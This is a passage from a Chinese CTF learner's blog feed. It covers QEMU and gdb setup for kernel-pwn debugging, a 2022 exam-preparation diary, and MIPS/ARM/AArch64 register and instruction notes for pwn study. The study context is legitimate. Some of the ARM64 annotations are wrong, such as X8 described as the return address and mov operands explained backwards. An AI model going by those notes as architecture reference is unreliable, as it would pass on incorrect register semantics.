seconds&quot;</span><br><span class="line">#为方便调试，改‘1000’为‘0’，即可获得root权限</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure><p><strong>重新打包rootfs.img</strong>并启动qemu，加载成功</p><p><img src="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230119162932352.png" class="lazyload placeholder" data-srcset="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230119162932352.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230119162932352"></p><p><strong>调试</strong></p><p>使用root权限调试（<del>上文提及</del>），使用如下命令调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 </span><br><span class="line">-kernel ../linux-5.4.98/linux-5.4.98/arch/x86/boot/bzImage </span><br><span class="line">-initrd ./rootfs.img </span><br><span class="line">-append &quot;console=ttyS0 nokaslr&quot; </span><br><span class="line">-nographic </span><br><span class="line">-gdb tcp::1234 </span><br><span class="line">-S #qemu启动后立即挂起，方便调试</span><br></pre></td></tr></table></figure><p>另起终端，执行命令 <code>gdb -q -ex &quot;target remote localhost:1234&quot;</code> 即可</p><p>执行后如下，会发现有些命令无法执行</p><p><img src="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230130162722386.png" class="lazyload placeholder" data-srcset="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230130162722386.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230130162722386"></p><p><strong>解决方案：使用gef-remote</strong></p><p>关于使用gef-remote可把我坑惨了，[大佬博客]( <a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/#%E4%B8%89%E3%80%81%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E8%B0%83%E8%AF%95">Kernel pwn CTF 入门 | Kiprey’s Blog</a> )写的是<code>gef-remote --qemu-mode loaclhost:1234</code>,由于gef的更新原因在我这却怎么也执行不了，于是查了gef手册最新的语句为<code>gef-remote --qemu-user --qemu-binary vmlinux_path ip port</code>在使用前一定要先<code>set architecture</code></p><p>为了方便调试，可以添加一些符号文件</p><ul><li><p><code>add-symbol-file vmlinux_path address</code></p><blockquote><p>关于address的获取及意义[这里]( [linux - The address where filename has been loaded is missing <a href="https://stackoverflow.com/questions/21508357/the-address-where-filename-has-been-loaded-is-missing-gdb">GDB] - Stack Overflow</a> )写的很清楚，address是gdb想知道的二进制文件的.text段的加载地址，可以使用<code>readelf -WS ./binary</code>获得</p></blockquote></li><li><p><code>add-symbol-file .ko address</code></p><blockquote><p><code>grep &lt;target_module_name&gt; /proc/modules</code>可以获得驱动加载的基地址</p><p><code> grep &quot;0x&quot; /sys/module/ko_test/sections/.*</code>可以获得内核模块各个段的地址，<strong>加载ko的符号文件时，添加越多的段地址越好，若只有.text段的地址，可能会下断点不成功</strong></p></blockquote></li></ul><p><img src="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230130170107355.png" class="lazyload placeholder" data-srcset="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230130170107355.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230130170107355"></p><p>添加完符号文件后，就可以对驱动里的函数下断点，如下</p><p><img src="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230130170219834.png" class="lazyload placeholder" data-srcset="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230130170219834.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230130170219834"></p><p><img src="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230130170344639.png" class="lazyload placeholder" data-srcset="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230130170344639.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230130170344639"></p><p>如想要断在ko_test_exit处，在qemu启动的内核shell输入<code>rmmod terget_mode_name</code>即可。</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p> <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/build-kernel/">内核下载与编译 - CTF Wiki (ctf-wiki.org)</a> </p><p> <a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/#%E4%B8%89%E3%80%81%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E8%B0%83%E8%AF%95">Kernel pwn CTF 入门 | Kiprey’s Blog</a> </p><p> <a href="https://blog.csdn.net/weixin_43889007/article/details/109499534">(71条消息) 老表带你学Linux kernel pwn 入门（一）_SiameseJuly的博客-CSDN博客_linux kernel pwn</a> </p><p> <a href="https://xz.aliyun.com/t/2306#toc-5">linux kernel pwn notes - 先知社区 (aliyun.com)</a> </p><p> <a href="https://hugsy.github.io/gef/commands/gef-remote/">gef-remote - GEF - GDB Enhanced Features documentation (hugsy.github.io)</a> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>llvmpass初探</title>
      <link href="/2023/01/06/llvmpass%E5%88%9D%E6%8E%A2/"/>
      <url>/2023/01/06/llvmpass%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>后续补充</p><p><img src="/2023/01/06/llvmpass%E5%88%9D%E6%8E%A2/image-20230106152539976.png" class="lazyload placeholder" data-srcset="/2023/01/06/llvmpass%E5%88%9D%E6%8E%A2/image-20230106152539976.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230106152539976"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>年终总结-2022</title>
      <link href="/2022/12/30/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93-2022/"/>
      <url>/2022/12/30/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93-2022/</url>
      
        <content type="html"><![CDATA[<h3 id="年终总结（2022）"><a href="#年终总结（2022）" class="headerlink" title="年终总结（2022）"></a>年终总结（2022）</h3><span id="more"></span><p>​    又是一年末，躺在床上回想着这一年里的细枝末节，没有了往年征战沙场游历四方的感觉，没有了技术飞速提升的感觉，这一年更像是在经历一场没有硝烟的战争，和着四面八方的敌人比精力拼耐力。考研就是一场对心性的考验，它过滤掉那些不成熟的，不勇敢的，不坚定的，留下一些不聪明的但却异常坚韧的供它戏耍，折磨。（<del>对于天才和保研的来说，我只能羡慕</del>） </p><p>​    就我而言，我记录下这一年的心里变化，供想走这条路的人一个参考（<del>也为明年可能二战的我做一个心里总结</del>）。</p><p>​    二月底，有了考研的想法，于是开始搜索各个学校往年的录取分数线和考试科目，以前一直弄不清为什么有的好学校的分数很低，而差一点的学校的分数却很高，原因在此，考试科目是不一样的。关注你想报考的院校的考试科目，结合自己的实际情况，在三月份-四月份确定自己的专业课。公共课基本都是差不多的，所以主要是看专业课。如何确定自己适合什么样的科目呢，就计算机相关科目而言，基本就是数据结构，计算机组成原理，操作系统，计算机网络，密码学这几门课，而各个院校的考试科目就是从这几门课中挑一门或多门组成。对于计科专业的同学来说一定不陌生，对于我们学校的网安和信安专业的同学，如果你曾自学C或C++语言，又参加过各种编程竞赛，那么数据结构就是一门对你来说必选的科目。如果你没有自学过编程语言，但可以跟上老师上课的进度，学起来也不困难，也可以选这门课。如果你接触过二进制，看过CSAPP，程序员自我修养等一系列底层书籍，那么计算机组成原理和操作系统很适合你，计算机组成原理更偏向底层，操作系统需要你对计算机有一定了解。如果你曾入门过web安全，那计算机网络一定是你入门web的基础中的基础。对于密码学，我没有发言权，因为一些特殊原因，我对这门课有一点点的抵触，但我知道信安专业的同学这门是必修课。清楚这些后，就可以根据自己擅长的科目选学校，当然，如果你已经有想考的院校，那么我上面说的可以不用参考，不论你擅不擅长，完全可以通过反复重复去理解学习，没有太大影响，我身边的一些人就是如此。</p><p>​    三月，开始每天用一些软件背单词，也开始买一些数学资料，由于刚开始复习，是精力最充沛的时期，觉得数学也就这样，觉得一天可以学12个小时，一个精力充沛的小生以自信姿态走上了这条充满荆棘的路。</p><p>​    四月，在咨询了学长后，我开始了我的专业课，因为有四门，加上对他们也不太熟悉，就开始的比较早些，为了感受下四门中最难的一门课的难度，我也最先开始了这一门–<strong>计算机组成原理</strong>，学了他之后，我开始慢慢有了些变化，中午晚上睡觉异常敏感，一点风吹草动就醒了，之前的我是倒床就睡，除非天塌下来才能把握喊醒，也是从这个时候，我开始感觉到了压力的存在。</p><p>​    五月，高数和第一门专业课结束，开始线代和第二门专业课，这个月一开始和辉神吃了顿饭，我跟他说感觉考研也没怎么难啊（<del>五月份zr的傻叉发言，和现在的我没有丝毫关系</del>），他跟我说再往后面你就知道了（<del>真理</del>）。</p><p>​    六月，第二门专业课结束，数学还在学线代，这个月的我殊不知已经被别人拉下了一大截了。留了一周专门复习期末考试。</p><p>​    七月，结束了线代，和第三门专业课，开始了概率论和第四门专业课，此时我已经意识到了进度被甩了太多，开始把心思放回了学习上。七月中旬结束了第一轮复习，开始了为时已晚的第二轮复习。第二轮的复习，才是开始感受到考研压迫力的开始。</p><p>​    八月，每门课的难度都开始骤增，每天都重复着之前学过但忘记的知识，日子逐渐开始变得无聊，唯一有点乐趣的事是国赛和队友一起打红警的时光，意识到游戏竟然那么好玩。开始慢慢发现身边有那么多的趣事和人，其本质估计是因为在复习上的不得志吧，人总要有需要让自己坚持下去的理由啊，一条被路受到挫折，就会去关心周围，关注别人的状态。</p><p>​    九月，同学们陆续回到学校，随之而来的是封闭图书馆，封闭学习的地方，只能留在宿舍，那时候感觉自己很郁闷，既不能愉快的玩耍，也不能沉下心去学习。也开始关注考研倒计时，有了些紧迫感。</p><p><img src="/2022/12/30/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93-2022/Screenshot_20221230_183530.jpg" class="lazyload placeholder" data-srcset="/2022/12/30/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93-2022/Screenshot_20221230_183530.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Screenshot_20221230_183530"></p><p>​    十月，经历了两周的封闭式管理，一周的宿舍休息，十月便有了充足的动力，但也没持续多长时间。在这个月发现了学习也是需要劳逸结合的，这个周期大概是一周，每学了一周，就会感觉头晕脑胀，学习效率急速下降，便会留出晚上的时间追剧，看一些感动的剧，让自己流流眼泪释放释放压力（<del>事实证明这个方法很ok</del>）。差点忘记了，中旬二轮结束了，主要是因为数学的进度太慢了，十月中旬能够结束还是因为放弃了很多题没有做，这是十分不好的，既打乱了自己的节奏，复习也没有到位。唯一庆幸的是专业课不慌不燥按部就班的复习着。</p><p>​    十一月，做历年真题和模拟卷，无情的刷题机器，可以很清晰的发现自己的问题出在哪里，无论做多少套题，数学总是在那个分段徘徊，一直不能有所突破，于是，我放弃了继续写模拟题，转回去补二轮复习遗留的历史任务，效果也还不错。这让我明白了一定不能被别人的进度打乱，按着自己的进度来，一步一步的复习。</p><p>​    十二月，便是查缺补漏的时间段了，也是政治和英语的提分阶段，我也是跟着自己的计划有条不紊的走着，但天有不测风云，疫情放开了，图书馆老师中招了（意料之内，学校只管学生，在学校里学生的地位排第三，狗排第二）。最后一周，我又回到了宿舍，这次我没有抱怨在宿舍学不了，因为也剩不了多少天了，听天由命，在考研的最后三天，我也中招了。我就这样没有组好准备便匆匆上了考场，所以一定要提前几天完成自己的任务，不要把临近考试的几天也算在内，因为你不知道会出什么幺蛾子。</p><p>​    九个多月的备战就这样结束了，虽然结果不是很理想，政治英语考的一塌糊涂，但我一直相信一点（<del>鸡汤警告</del>），你的努力是影响结果的决定因素，不管过程怎么样，不管哪门考的好，哪门考的差，最后的结果是不会有太大的变化的。不要去在意自己考这门运气为什么这门差，也不要得意于这一题我又蒙对了，你失去或得到的分最终都会相抵消，趋于平衡，总分是不会有太大差距的，结果也不会有太大差距的。</p><p>​    考研到这也就先告一段落了，在这一年里也还发生了很多有趣的事，因去年疫情原因，期末考试被延期至下一学期，而正好有一门课是操作系统，我就利用自己买的考研资料去复习期末考试。而当六月份又要准备期末考试时，在灰神的帮助下，成功拿到往年试卷（<del>我们学校的考试都是老师根据往年试卷改一些题目改成的，所以往年试卷算是机密文件</del>）。八月份一起在实验室打国赛总决赛，yaoxi三分钟不到秒了AAA的题目，拿了全场一血。我们靠着修题拿下了全国一等奖！虽然这次国赛的patch和break分值竟然是一样的很不合理，但真香就😁。一有压力或不顺心的事就找胖亚喝酒唱歌。每天越起越早去抢座位，奈何座位越抢越少，最后直接被迫换阵地。好家伙五楼不愧全是考985的，很安逸，每个人都有自己的专属”座位“，学习氛围浓厚，关系融洽，不适合我这个外来人，于是又回到了之前的阵地，学习效率飞速提升。唯一不好的就是太冷（<del>太冷使人变少，这也是为啥我能回来的原因</del>），以至于我穿两条秋裤才能扛得住。收到了学妹送来的加油祝福卡片，顿时觉得自己之前和现在做的事情有了意义。在考试前三天烧到了40.3°C，一烧就是一下午，真刺激，以至于后面38°C都没了感觉，考试的两天虽然也是低烧，但一点感觉都没，这估计就是祸福相依了吧。</p><p>​    不管最后结果如何，心性的成熟成了这一年我认为的最大的收获。</p><p>​                                                                        ——2022-12-30 19：53完</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>异构pwn学习记录</title>
      <link href="/2022/01/19/%E5%BC%82%E6%9E%84pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/01/19/%E5%BC%82%E6%9E%84pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="异构pwn学习记录"><a href="#异构pwn学习记录" class="headerlink" title="异构pwn学习记录"></a>异构pwn学习记录</h3><span id="more"></span><h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><h3 id="Mips寄存器"><a href="#Mips寄存器" class="headerlink" title="Mips寄存器"></a>Mips寄存器</h3><p>MIPS32寄存器分为两类：通用寄存器（GPR）和特殊寄存器。 通用寄存器：MIPS体系结构中有32个通用寄存器，汇编程序中用$0~$31表示。也可以用名称表示，如$sp、$t1、$ra等。</p><table><thead><tr><th>编号</th><th>寄存器名称</th><th>描述</th></tr></thead><tbody><tr><td>$0</td><td>$zero</td><td>第0号寄存器，其值始终为0。</td></tr><tr><td>$1</td><td>$at</td><td>保留寄存器</td></tr><tr><td>$2-$3</td><td>$v0-$v1</td><td>values，保存表达式或函数返回结果</td></tr><tr><td>$4-$7</td><td>$a0-$a3</td><td>argument，作为函数的前四个参数</td></tr><tr><td>$8-$15</td><td>$t0-$t7</td><td>temporaries，供汇编程序使用的临时寄存器</td></tr><tr><td>$16-$23</td><td>$s0-$s7</td><td>saved values，子函数使用时需先保存原寄存器的值</td></tr><tr><td>$24-$25</td><td>$t8-$t9</td><td>temporaries，供汇编程序使用的临时寄存器，补充$t0-$t7。</td></tr><tr><td>$26-$27</td><td>$k0-$k1</td><td>保留，中断处理函数使用</td></tr><tr><td>$28</td><td>$gp</td><td>global pointer，全局指针</td></tr><tr><td>$29</td><td>$sp</td><td>stack pointer，堆栈指针，指向堆栈的栈顶</td></tr><tr><td>$30</td><td>$fp</td><td>frame pointer，保存栈指针</td></tr><tr><td>$31</td><td>$ra</td><td>return address，返回地址</td></tr></tbody></table><p>特殊寄存器：有3个特殊寄存器：PC（程序计数器）、HI（乘除结果高位寄存器）和LO（乘除结果低位寄存器）。在乘法时，HI保存高32位，LO保存低32位。除法时HI保存余数，LO保存商。</p><h3 id="MIPS常用指令集"><a href="#MIPS常用指令集" class="headerlink" title="MIPS常用指令集"></a>MIPS常用指令集</h3><p><strong>lb/lh/lw</strong>: 从存储器中读取一个byte/half word/word的数据到寄存器中.如lb $1, 0($2)  ($1=$2+0)</p><p><strong>li：</strong>立即数的值给寄存器 li $1,0x1</p><p><strong>lui</strong>:把一个16位的立即数填入到寄存器的高16位，低16位补零。</p><p><strong>sb/sh/sw</strong>: 把一个byte/half word/word的数据从寄存器存储到存储器中.如 sb $1, 0($2) ($2+0=$1)</p><p><strong>add/addu</strong>:把两个定点寄存器的内容相加add $1,$2,$3($1=$2+$3);u为不带符号加。</p><p><strong>addi/addiu</strong>:把一个寄存器的内容加上一个立即数add $1,$2,#3($1=$2+3);u为不带符号加。</p><p><strong>sub/subu</strong>：把两个定点寄存器的内容相减。</p><p><strong>div/divu</strong>:两个定点寄存器的内容相除。</p><p><strong>mul/mulu</strong>:两个定点寄存器的内容相乘。</p><p>**and/andi:**与运算，两个寄存器中的内容相与and $1,$2,$3($1=$2 &amp; $3);i为立即数。</p><p><strong>or/ori</strong>:或运算。</p><p><strong>xor/xori</strong>:异或运算。</p><p><strong>beq/beqz/benz/bne</strong>:条件转移eq相等，z零，ne不等。</p><p><strong>bal</strong>：跳转指令</p><p><strong>j/jr/jal/jalr</strong>:j直接跳转；jr使用寄存器跳转；</p><p><strong>sll/srl</strong>:逻辑左移/右移sll $1,$2,#2。</p><p><strong>slt/slti/sltui</strong>:如果$2的值小于$3，那么设置$1的值为1,否则设置$1的值为0。slt $1,$2,$3。</p><p><strong>mov/movz/movn</strong>:复制，n为负，z为零。mov $1,$2; movz $1,$2,$3($3为零则复制$2到$1)。</p><p><strong>trap</strong>:根据地址向量转入管态。</p><p><strong>eret</strong>:从异常中返回到用户态。 </p><h3 id="Mips函数调用过程"><a href="#Mips函数调用过程" class="headerlink" title="Mips函数调用过程"></a>Mips函数调用过程</h3><ul><li><p>mips架构和x86架构中，栈的增长方向相同，都是从高地址向低地址增长，但是没有栈底指针，所以调用一个函数是，需要将当前栈向低地址处移动n比特这个大小为n比特的空间就是此函数的栈桢存储区域；</p></li><li><p>mips架构中有叶子函数和非叶子函数的区别，叶子函数就是此函数自身不再调用别的函数，非叶子函数就是此函数自身调用别的函数。如果函数A调用函数B，调用者函数会在自己的栈顶预留一部分空间来保存被调用者（函数B）的参数，称之为参数调用空间；</p></li><li><p>函数调用过程中，父函数调用子函数，复制当前$PC的值到$RA寄存器，然后跳转到子函数执行。到子函数是，子函数如果为非叶子函数，则在函数入口子函数的返回地址会先存入堆栈。</p></li><li><p>参数传递方式，前四个参数通过$a0-$a3来传递，多于的参数会放入调用参数空间(参数会被保存在栈上)，可以类比x86_64参数传递规则来进行记忆。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#进入函数</span><br><span class="line">addiu$sp,-0x28</span><br><span class="line">sw$ra,0x28+var_4($sp)</span><br><span class="line">sw$fp,0x28+var_8($sp)</span><br><span class="line">mov$fp,$sp</span><br><span class="line">#返回函数</span><br><span class="line">move$sp,$fp</span><br><span class="line">lw$ra,0x28+var_4($sp)</span><br><span class="line">lw$fp,0x28+var_8($sp)</span><br><span class="line">addiu$sp,0x28</span><br><span class="line">jr$ra</span><br><span class="line">nop</span><br></pre></td></tr></table></figure><h2 id="Arm"><a href="#Arm" class="headerlink" title="Arm"></a>Arm</h2><h3 id="Arm寄存器"><a href="#Arm寄存器" class="headerlink" title="Arm寄存器"></a>Arm寄存器</h3><table><thead><tr><th align="center">ARM</th><th align="center">Description</th><th align="center">x86</th></tr></thead><tbody><tr><td align="center">R0</td><td align="center">General Purpose(可被用作累加器、第一个参数)</td><td align="center">EAX</td></tr><tr><td align="center">R1-R5</td><td align="center">General Purpose(第2、3、4个参数)</td><td align="center">EBX,ECX,EDX,ESI,EDI</td></tr><tr><td align="center">R6-R10</td><td align="center">General Purpose(R7存储系统调用号)</td><td align="center">-</td></tr><tr><td align="center">R11(FP)</td><td align="center">Frame Pointer</td><td align="center">EBP</td></tr><tr><td align="center">R12</td><td align="center">Intra Procedural Call</td><td align="center">-</td></tr><tr><td align="center">R13(SP)</td><td align="center">Stack Pointer</td><td align="center">ESP</td></tr><tr><td align="center">R14(LR)</td><td align="center">Link Register</td><td align="center">-</td></tr><tr><td align="center">R15(PC)</td><td align="center">&lt;Program Counter/Instruction Pointer&gt;</td><td align="center">EIP</td></tr></tbody></table><h3 id="Arm常用指令集"><a href="#Arm常用指令集" class="headerlink" title="Arm常用指令集"></a>Arm常用指令集</h3><table><thead><tr><th align="center">指令</th><th align="center">描述</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">MOV</td><td align="center">移动数据</td><td align="center">EOR</td><td align="center">按位异或</td></tr><tr><td align="center">MVN</td><td align="center">移动并取反</td><td align="center">LDR</td><td align="center">加载</td></tr><tr><td align="center">ADD</td><td align="center">加</td><td align="center">STR</td><td align="center">存储</td></tr><tr><td align="center">SUB</td><td align="center">减</td><td align="center">LDM</td><td align="center">加载多个</td></tr><tr><td align="center">MUL</td><td align="center">乘</td><td align="center">STM</td><td align="center">存储多个</td></tr><tr><td align="center">LSL</td><td align="center">逻辑左移</td><td align="center">PUSH</td><td align="center">入栈</td></tr><tr><td align="center">LSR</td><td align="center">逻辑右移</td><td align="center">POP</td><td align="center">出栈</td></tr><tr><td align="center">ASR</td><td align="center">算数右移</td><td align="center">B</td><td align="center">跳转</td></tr><tr><td align="center">ROR</td><td align="center">右旋</td><td align="center">BL</td><td align="center">ｌｉｎｋ跳转</td></tr><tr><td align="center">CMP</td><td align="center">比较</td><td align="center">BX</td><td align="center">分支跳转</td></tr><tr><td align="center">AND</td><td align="center">按位与</td><td align="center">BLX</td><td align="center">ｌｉｎｋ分支跳转</td></tr><tr><td align="center">ORR</td><td align="center">按位或</td><td align="center">SWI/SVC</td><td align="center">系统调用</td></tr></tbody></table><p><img src="/2022/01/19/%E5%BC%82%E6%9E%84pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220119103930687.png" class="lazyload placeholder" data-srcset="/2022/01/19/%E5%BC%82%E6%9E%84pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220119103930687.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220119103930687"></p><p>CMP R0, R1 ; R0与R1比较，做R0-R1的操作</p><p>ADDHI R0, R0, #1 ;若R0 &gt; R1, 则R0 = R0 + 1</p><p>ADDLS R1, R1, #1 ; 若R0 &lt;= R1, 则R1 = R1 + 1</p><h2 id="Aarch64（Arm64）"><a href="#Aarch64（Arm64）" class="headerlink" title="Aarch64（Arm64）"></a>Aarch64（Arm64）</h2><h3 id="Aarch64（Arm64）寄存器"><a href="#Aarch64（Arm64）寄存器" class="headerlink" title="Aarch64（Arm64）寄存器"></a>Aarch64（Arm64）寄存器</h3><table><thead><tr><th>ARM64</th><th>Descript</th></tr></thead><tbody><tr><td>X0~X7</td><td>传递参数，返回值用X0表示</td></tr><tr><td>X8</td><td>程序返回地址</td></tr><tr><td>X9~X15</td><td>临时寄存器，使用时不需要保存</td></tr><tr><td>X16~X17</td><td>子程序内部调用寄存器</td></tr><tr><td>X18</td><td>平台寄存器</td></tr><tr><td>X19~X28</td><td>临时寄存器，使用时必须保存</td></tr><tr><td>X29</td><td>帧指针寄存器，使用时需要保存（）</td></tr><tr><td>X30</td><td>链接寄存器LR,保存跳转返回信息地址</td></tr><tr><td>X31</td><td>堆栈指针寄存器SP或零寄存器 （esp）</td></tr><tr><td>XZR</td><td>64bit Zero寄存器,读出的数据全为0</td></tr><tr><td>WZR</td><td>32bit Zero寄存器的32bit形式</td></tr></tbody></table><p><del>子程序调用时必须要保存的寄存器：X19~X29和SP(X31)</del></p><p><del>不需要保存的寄存器：X0<del>X7,X9</del>X15</del></p><p><del>只用低 32bit的w0-w30</del> </p><h3 id="Arm64常用指令集"><a href="#Arm64常用指令集" class="headerlink" title="Arm64常用指令集"></a>Arm64常用指令集</h3><ul><li><p>MOV x1，x0; 将寄存器x0的值传送到寄存器x1</p></li><li><p>ADD x0，x1，x2; 寄存器x1和x2的值相加后传送到x0</p></li><li><p>SUB x0，x1，x2; 寄存器x1和x2的值相减后传送到x0</p></li><li><p>AND x0，x0，#0xF; x0的值与0xF相位与后的值传送到x0</p></li><li><p>ORR x0，x0，#9; x0的值与9相位或后的值传送到x0</p></li><li><p>EOR x0，x0，#0xF; x0的值与0xF相异或后的值传送到x0</p></li><li><p>LDR x5，[x6，#0x8]; x6寄存器加0x8地址的内容传送到x5</p></li><li><p>STR x0, [SP, #0x8]; x0寄存器的数据传送到SP+0x8地址值指向的存储空间</p></li><li><p>STP x29, x30, [sp, #0x10]; 入栈指令</p></li><li><p>LDP x29, x30, [sp, #0x10]; 出栈指令</p></li><li><p>CBZ x19, 0x10; 比较，如果结果为零（Zero）就转移（只能跳到后面的指令）</p></li><li><p>CBNZ x19, 0x10; 比较，如果结果非零（Non Zero）就转移（只能跳到后面的指令）</p></li><li><p>B/BL ; 绝对跳转#imm，返回地址保存到LR(x30)</p></li><li><p>b ffff000008283b80</p></li><li><p>bl ffff000008dc566c</p></li></ul><p><del>MOV 指令只能用于寄存器之间传值，寄存器和内存之间传值通过 LDR 和 STR.</del></p><p><img src="/2022/01/19/%E5%BC%82%E6%9E%84pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220119104702625.png" class="lazyload placeholder" data-srcset="/2022/01/19/%E5%BC%82%E6%9E%84pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220119104702625.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220119104702625"></p><p>example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">000000000003a150 &lt;example_test&gt;:</span><br><span class="line"> 3a150: a9be7bfd  stp x29, x30, [sp,#-32]! //把x29 x30 的值存到sp-32的地址后，sp=sp-32</span><br><span class="line"> 3a154: 910003fd  mov x29, sp              //把 x29的值放在sp中</span><br><span class="line"> 3a158: a90153f3  stp x19, x20, [sp,#16]   //把x19 x20 的值存到sp+16的地址中后sp=sp+16</span><br><span class="line"> 3a15c: 2a0003f3  mov w19, w0              //把w19 的值存到w0 中</span><br><span class="line"> 3a160: aa1e03e0  mov x0, x30              //把x0 的值放在x30</span><br><span class="line"> 3a164: aa0103f4  mov x20, x1              //把x20的值放在x1</span><br><span class="line"> 3a168: 94000000  bl 0 &lt;_mcount&gt;           //跳转到地址0，这里还不太清楚，我理解是需要加载ko后，跳转到某些符号对应的地址上</span><br><span class="line"> 3a16c: 6b1f027f  cmp w19, wzr             //比较w19 和 0</span><br><span class="line"> 3a170: 540000ed  b.le 3a18c &lt;example_test+0x3c&gt; //如果小于 就跳转到&lt;example_test+0x3c&gt;这个地址</span><br><span class="line"> 3a174: 52800020  mov w0, #0x1             // 写w0 为1</span><br><span class="line"> 3a178: b9000280  str w0, [x20]            //w0的值写到x20内</span><br><span class="line"> 3a17c: 52800000  mov w0, #0x0             // w0 清零</span><br><span class="line"> 3a180: a94153f3  ldp x19, x20, [sp,#16]   // sp+16 地址的值分别放回x19 x20</span><br><span class="line"> 3a184: a8c27bfd  ldp x29, x30, [sp],#32   //sp地址取的值分别放回x29 x30后sp=sp+32</span><br><span class="line"> 3a188: d65f03c0  ret                      //返回</span><br><span class="line"> 3a18c: 52800200  mov w0, #0x10            //w0 的值写成0x10</span><br><span class="line"> 3a190: b9000280  str w0, [x20]            //w0 的值存到 x20</span><br><span class="line"> 3a194: 52800000  mov w0, #0x0             // w0 清零</span><br><span class="line"> 3a198: a94153f3  ldp x19, x20, [sp,#16]   // sp+16 地址的值分别放回x19 x20</span><br><span class="line"> 3a19c: a8c27bfd  ldp x29, x30, [sp],#32   //sp地址取的值分别放回x29 x30后sp=sp+32</span><br><span class="line"> 3a1a0: d65f03c0  ret                      //返回</span><br><span class="line"> 3a1a4: d503201f  nop                      //空操作</span><br></pre></td></tr></table></figure><h3 id="Aarch64函数调用过程"><a href="#Aarch64函数调用过程" class="headerlink" title="Aarch64函数调用过程"></a>Aarch64函数调用过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#进入函数</span><br><span class="line">   0x4009a8    stp    x29, x30, [sp, #-0x20]!#将x29、x30的值存入sp-0x20地址中</span><br><span class="line">   0x4009ac    mov    x29, sp</span><br><span class="line">#返回函数</span><br><span class="line">   0x400a04    ldp    x29, x30, [sp], #0x20 #将sp的内容放入x29、x30后，sp=sp-0x20</span><br><span class="line">   0x400a08    ret  </span><br></pre></td></tr></table></figure><h3 id="例题"><a href="#例题" class="headerlink" 